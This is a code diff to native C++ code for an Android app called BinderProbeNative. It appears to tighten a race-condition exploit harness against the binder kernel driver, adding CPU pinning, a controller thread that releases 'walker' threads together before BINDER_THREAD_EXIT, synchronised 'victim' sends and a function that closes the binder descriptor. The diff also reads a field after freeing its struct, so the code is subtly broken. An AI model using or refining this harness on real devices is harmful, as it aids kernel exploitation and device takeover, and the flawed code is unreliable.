@@ -13,6 +13,8 @@
 #include <cstdio>
 #include <cstdlib>
 #include <pthread.h>
+#include <atomic>
+#include <sched.h>
 
 #define TAG "BinderProbeNative"
 
@@ -289,7 +291,11 @@ static int wait_for_child(int fd, uint32_t expected_code) {
     return -3;
 }
 
-struct walker_arg { int fd; int32_t handle; int index; };
+static std::atomic<int> g_armed{0};
+static std::atomic<int> g_go{0};
+static int g_expected{0};
+
+struct walker_arg { int fd; int32_t handle; int index; int expected; };
 
 static void* walker_worker(void* opaque) {
     struct walker_arg* arg = reinterpret_cast<struct walker_arg*>(opaque);
@@ -297,12 +303,21 @@ static void* walker_worker(void* opaque) {
     int32_t handle = arg->handle;
     int index = arg->index;
     free(arg);
-    int send_rc = raw_send(fd, handle, 1, 0, nullptr, 0);
+    cpu_set_t set;
+    CPU_ZERO(&set);
+    CPU_SET((unsigned)(index % (int)sysconf(_SC_NPROCESSORS_ONLN)), &set);
+    int pin_rc = sched_setaffinity(0, sizeof(set), &set);
+    int expected = arg->expected;
+    int send_rc = raw_send(fd, handle, 1, 0, &expected, sizeof(expected));
     int child_rc = wait_for_child(fd, 2);
-    __android_log_print(ANDROID_LOG_INFO, TAG, "worker index=%d send=%d child=%d", index, send_rc, child_rc);
+    __android_log_print(ANDROID_LOG_INFO, TAG, "worker index=%d pin=%d send=%d child=%d", index, pin_rc, send_rc, child_rc);
     if (child_rc == 0) {
-        usleep(100000 + (useconds_t)index * 5000);
+        g_armed.fetch_add(1, std::memory_order_release);
     }
+    while (!g_go.load(std::memory_order_acquire)) {
+        usleep(1000);
+    }
+    usleep(50000 + (useconds_t)index * 5000);
     (void)ioctl(fd, BINDER_THREAD_EXIT, 0);
     __android_log_print(ANDROID_LOG_INFO, TAG, "worker index=%d exited", index);
     return nullptr;
@@ -321,10 +336,13 @@ Java_org_opencrown_binderprobe_HarnessNative_walkerStart(
     int32_t handle = handle_of_data(victim_native_data);
     __android_log_print(ANDROID_LOG_INFO, TAG, "walkerStart fd=%d victim_handle=%d threads=%d", fd, handle, threads);
     if (fd < 0 || handle < 0) return -1;
+    g_armed.store(0);
+    g_go.store(0);
+    g_expected = threads;
     for (int i = 0; i < threads; i++) {
         struct walker_arg* arg = static_cast<struct walker_arg*>(malloc(sizeof(*arg)));
         if (arg == nullptr) break;
-        arg->fd = fd; arg->handle = handle; arg->index = i;
+        arg->fd = fd; arg->handle = handle; arg->index = i; arg->expected = threads;
         pthread_t thread;
         if (pthread_create(&thread, nullptr, walker_worker, arg) != 0) {
             free(arg);
@@ -332,7 +350,29 @@ Java_org_opencrown_binderprobe_HarnessNative_walkerStart(
         }
         pthread_detach(thread);
     }
+    pthread_t controller;
+    if (pthread_create(&controller, nullptr, [](void*) -> void* {
+        for (int i = 0; i < 2000; i++) {
+            if (g_armed.load(std::memory_order_acquire) >= g_expected) break;
+            usleep(1000);
+        }
+        __android_log_print(ANDROID_LOG_INFO, TAG, "controller armed=%d go", g_armed.load());
+        g_go.store(1, std::memory_order_release);
+        return nullptr;
+    }, nullptr) == 0) {
+        pthread_detach(controller);
+    }
     return 0;
+}
+
+
+extern "C" JNIEXPORT jint JNICALL
+Java_org_opencrown_binderprobe_HarnessNative_closeBinder(
+        JNIEnv*, jobject) {
+    int fd = find_binder_fd();
+    __android_log_print(ANDROID_LOG_INFO, TAG, "closeBinder fd=%d", fd);
+    if (fd < 0) return -1;
+    return close(fd);
 }
 
 extern "C" JNIEXPORT jint JNICALL
@@ -340,7 +380,11 @@ Java_org_opencrown_binderprobe_HarnessNative_victimChild(
         JNIEnv*, jobject, jlong walker_native_data) {
     int fd = find_binder_fd();
     int32_t handle = handle_of_data(walker_native_data);
-    __android_log_print(ANDROID_LOG_INFO, TAG, "victimChild fd=%d walker_handle=%d", fd, handle);
+    cpu_set_t set;
+    CPU_ZERO(&set);
+    CPU_SET(0, &set);
+    int pin_rc = sched_setaffinity(0, sizeof(set), &set);
+    __android_log_print(ANDROID_LOG_INFO, TAG, "victimChild fd=%d walker_handle=%d pin=%d", fd, handle, pin_rc);
     if (fd < 0 || handle < 0) return -1;
     return raw_send(fd, handle, 2, 0, nullptr, 0);
 }
